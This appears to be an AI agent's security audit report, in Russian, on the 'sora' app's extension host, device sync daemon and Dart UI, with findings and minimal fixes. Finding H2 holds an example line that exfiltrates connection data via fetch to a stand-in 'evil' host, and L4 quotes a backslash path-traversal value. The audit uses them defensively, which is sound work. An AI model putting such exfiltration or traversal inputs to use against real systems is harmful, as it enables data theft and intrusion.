# Power-run partial-01: Adversarial Security (агент №1)

Ветка `bugfix/audit-2026-10-19`, рабочая копия `~/workspace/bug-hunt/sora`. Зоны: `core/ext`, `core/control/{exthost,benchmark,dnsleak,override}.go`, `core/probe/bandwidth.go`, `core/subscription/override.go`, `core/session/watchdog.go`, `service/sync/*`, `app/lib/src/{ext,ui/extensions}/`, `qr.dart`→`desktop/links.dart`+`ui/qr.dart`, `sync.dart`+`ui/sync.dart`.

## Фильтр слопа (директива владельца)

Применён к каждой находке и каждому фиксу. Вердикт фильтра указан явно: **«лучшее»** — минимальное честное решение, прямо закрывающее дыру; **«спорно»** — помечаю честно, не протаскиваю. Фейковые фичи и «модные, но пустые» решения отсечены (см. находку H1 — ровно такой случай в самом продукте).

## Сводка

| Severity | Найдено | Пофикшено |
|---|---|---|
| High | 2 | 0 (обе — уровень спеки/владельца: одна требует продуктового решения, вторая — Dart, read-only) |
| Medium | 4 | 3 |
| Low | 4 | 0 (3 — Dart read-only, 1 — осознанно не тронут: Go-сторона доказуемо безопасна, лишняя проверка была бы функциональным шумом) |
| [cross-ref] | 2 | 0 (чужой угол — не чиню) |

Коммит: `62e8623` `[power-run] security: ...` (4 файла, без пуша). `go build` + `go vet` + `go test` — чисто для `core/ext` и всего `service/sync`.

---

## H1. F9: UI синка — театр безопасности (фейковая фича)

**Файлы:** `app/lib/src/ui/sync.dart`, `app/lib/src/sync.dart`
**Сценарий атаки / суть:** Экран «Синхронизация» заявляет «End-to-end encrypted device sync» и «Secrets sync too», но:
- «Show my code» показывает QR `sora-sync://pair?v=1&token=<hex>`, сгенерированный локально в Dart (`SyncPairing.newToken()`). Go-демон этот токен никогда не видит.
- «Scan code» → `decodePairPayload` → `_nameAndAdd(token)` — просто кладёт строку токена в локальный Dart-реестр как `SyncedDevice(id: token)`. **Никакой криптографии не происходит.**
- HTTP API демона (`/v1/pairing/start|join`, `/v1/peers`, bearer-токен) приложением **не вызывается вообще** (проверено grep по `app/lib`).
- Форматы QR расходятся: Dart `token=<hex>` без `id/pub/port` vs Go `pairing.Encode()` (`id`, `pub`, `token=<b64>`, `port`) — настоящий Go-QR сканер приложения тоже «пейрит» мусорным id.
- `docs/sync-threat-model.md`, раздел «What the app must do» (показ пиров через `GET /v1/peers`, отзыв чужих), описывает поведение, которого нет.

Пользователь верит, что устройства E2E-спейрены; по факту ничего не спейрено и не синкается. Хуже: если «проводку» потом добавят наспех, `SyncedDevice.id = token` (значение, фотографируемое с экрана) могут принять за аутентифицированный идентификатор устройства.
**Как исправить:** продуктовое решение — либо по-настоящему завайрить приложение на демона (HTTP-клиент + `api_token` + унификация QR на Go-формат приглашения), либо убрать/пометить экран как прототип. Мелкого честного фикса нет.
**Вердикт фильтра:** «лучшее» здесь — только честное решение (реальная проводка или удаление фейка). Латание QR-формата без демона было бы слопом. **Не чиню — спека/владелец.**

## H2. Панели расширений: документированный «no network from JS» не enforced

**Файлы:** `app/lib/src/ui/extensions/panel_screen.dart`; спека `docs/extensions/manifest-v1.md` (§4: «`fetch`/`XMLHttpRequest` from panel JS have no network access in v1», «Navigation outside the package is blocked»).
**Сценарий:** Реализация блокирует только *навигацию* (`onNavigationRequest` → только origin `127.0.0.1:<ephemeral>`). `fetch()`/XHR/WebSocket из JS панели **ничем не ограничены**. Вредоносное расширение с `connections.read` делает `fetch('https://evil/collect', {body: JSON.stringify(conns)})` — процессы, хосты, счётчики уходят наружу. Модель разрешений при злонамеренном авторе становится декоративной.
**Как исправить (Dart, мне read-only):** в `_LocalPanelServer._handle` отдавать на каждый ответ заголовок `Content-Security-Policy: connect-src 'none'` (плюс разумно `default-src 'self'`) — серверный CSP страница ослабить не может; это единицы строк и прямо реализует задокументированное свойство. Альтернатива — платформенный перехват запросов (дороже, не везде возможно).
**Вердикт фильтра:** «лучшее» — CSP-заголовок: минимально, честно, ровно то, что обещает спека. **Не чиню — Dart без тулчейна.**

## M1. WatchExtensionEvents отдавал journal Detail токенам с нулевыми правами [FIXED]

**Файл:** `core/ext/host.go` (коммит `62e8623`).
В `rpcPermissions` не было записи для `WatchExtensionEvents` («пусто = любой валидный токен»). Стрим нёс **весь** journal, включая `EventNetwork` Detail — сырой LAN-фингерпринт (`wlan0 192.168.1.5`, IPv6 /64, имена интерфейсов; см. `core/session/network.go: NetworkFingerprint`). Обоснование в proto — «extension may know whether the session is up», реализация текла дальше. Токен с пустым набором прав (выглядит безобидно) = тихий сбор топологии LAN.
**Фикс:** форвардится только `Kind`, `Detail: ""`. Потребителей нет (Dart-бридж проксирует сам, токены не использует) — поведение никому не ломает.
**Вердикт фильтра:** латентно (текущих вызывателей нет), но 2-строчная коррекция документированной границы — честное упрочнение, не слоп.

## M2. mDNS-spoof → демон синка звонит на произвольный IP [FIXED]

**Файлы:** `service/sync/api/pairing.go` (`Join`), `service/sync/api/syncloop.go` (`SyncPeer`).
`discovery.FindDevice` возвращает `Addr` из mDNS-ответа — на LAN он тривиально спуфится. `Join` звонил `found.Addr:inv.Port`, `SyncPeer` — `found.Addr:found.Port` без валидации. Атакующий в LAN подменяет ответ → демон dial-ится на WAN-IP атакующего → Noise_XX **по дизайну паттерна** раскрывает респонденту long-term identity key инициатора. Итог: исходящее соединение + раскрытие стабильного идентификатора устройства за пределы LAN (threat-model принимает утечку device id только *внутри* LAN).
**Фикс:** `lanAddr()` — dial-target только loopback/private/link-local; в обоих путях отказ с ошибкой.
**Вердикт фильтра:** «лучшее» — настоящая граница доверия, минимально.

## M3. Безлимитные handshake на LAN-слушателях = LAN DoS [FIXED]

**Файлы:** те же. `pairingLoop` (окно 5 мин, порт в mDNS) и персистентный sync-listener принимали неограниченно коннектов; каждый handshake жжёт X25519 при таймаутах 30с–3мин.
**Фикс:** семафоры — 4 для пейринга (легитимно нужен 1), 8 для синка; избыточные коннекты закрываются.
**Вердикт фильтра:** стандартная минимальная практика, честно.

## M4. Dart `ExtPackage.open` беззащитен перед zip-бомбой

**Файл:** `app/lib/src/ext/package.dart`. `ZipDecoder().decodeBytes(data)` инфлейтит **весь** архив до проверок размеров; `.soraext` ≤64 МиБ может развернуться в гигабайты → OOM приложения. Sideload — ровно модель, где пакет пишет атакующий (ключ self-attested). Go-сторона защищена (`io.LimitReader`).
**Как исправить:** пре-скан declared sizes в central directory + потоковый inflate с бюджетом байт (в `package:archive` нетривиально) — уровень спеки.
**Вердикт фильтра:** реальный DoS-вектор; дешёвого честного фикса в Dart нет — не леплю полумеру. **Спека.**

## L1. Dart-стор пишет без 0600

**Файл:** `app/lib/src/ext/store.dart`. `installed.json`, `<id>.settings.json`, распакованное содержимое — `writeAsBytes` без mode → umask (обычно 0644). Настройки расширений могут содержать введённые пользователем секреты (API-ключи). Go-сторона везде 0600/0700. Читаемо другими локальными пользователями на shared-машине.
**Как исправить:** chmod 0600 после записи через platform channel (у `writeAsBytes` нет параметра mode).
**Вердикт фильтра:** реально на мульти-юзер десктопах; фикс платформенный. **Dart read-only.**

## L2. `network_hosts` не валидируется + расхождение манифестов Go/Dart

**Файл:** `app/lib/src/ext/manifest.dart`. `_networkHostPattern` определён, но `_parseNetworkHosts` его **не применяет** (только непусто/длина) — записи показываются в промпте как allowlist. Плюс: Go-манифест (`DisallowUnknownFields`, поля нет) **реджектит** манифесты, которые Dart принимает. Сегодня display-only (v2-рантайма нет), но к моменту enforcement `net.fetch` невалидированные записи — риск обхода.
**Как исправить (Dart):** применить паттерн или убрать v2-поле из v1-парсера.
**Вердикт фильтра:** честная parity-находка, low urgency. **Dart read-only.**

## L3. Промпт апдейта не подсвечивает расширение прав

**Файл:** `app/lib/src/ui/extensions/store_screen.dart` (`_installBytes` не передаёт `addedPermissions`, хотя `permissions_sheet.dart` это умеет). При апдейте юзер видит полный список с кнопкой «Install», а не дельту. Тихого расширения грантов нет (install требует покрытия всех прав), так что чисто UX.
**Вердикт фильтра:** «спорно» — зазор есть, но не обход; фикс в одну строку (`diffPermissions` до промпта). **Dart read-only.**

## L4. Backslash в путях архива: обе стороны полагаются на пост-нормализацию

`isSafeArchivePath` (Go) и `_isSafePath` (Dart) пропускают `..\..\evil.html` (бэкслэш не сепаратор в их проверках). Go доказуемо безопасен: проверка containment идёт **после** `filepath.Join` (который чистит `..`). Dart — `File(target).absolute.path` нормализует `..` (package:path `absolute`→`join`→`normalize`), т.е. *по-видимому* безопасен, но это тонкое неявное свойство.
**Вердикт фильтра:** «спорно» — в Go лишняя проверка была бы функциональным шумом при доказанной безопасности → **осознанно не меняю**. Для Dart рекомендую реджектить `\` на open (zip-спека требует `/`) — hardening.

## [cross-ref] — чужой угол, не чиню

- **C1. `core/subscription/override.go`:** Load→(мёрж)→Save без удержания мьютекса между вызовами — потеря конкурирующего апдейта. Только data-loss, без внешнего триггера. (конкурентность)
- **C2. `service/sync/api`:** `upsertPeer` заводит новую запись по self-asserted `DeviceID` пира при совпадении ключа — привилегий не даёт (аутентификатор — ключ), варт модели данных.

## Проверено и крепко (находок нет)

- Подписи пакетов: checksums покрывают каждый файл ровно один раз; подпись — minisign over checksums.txt с trusted comment (`timestamp/file/sha256`); team-ключ — placeholder с fail-closed (церемония — за владельцем, уже в FIX-PLAN); TOCTOU verify→install отсутствует (in-memory пакет); downgrade заблокирован в обе
...[truncated 1452 chars]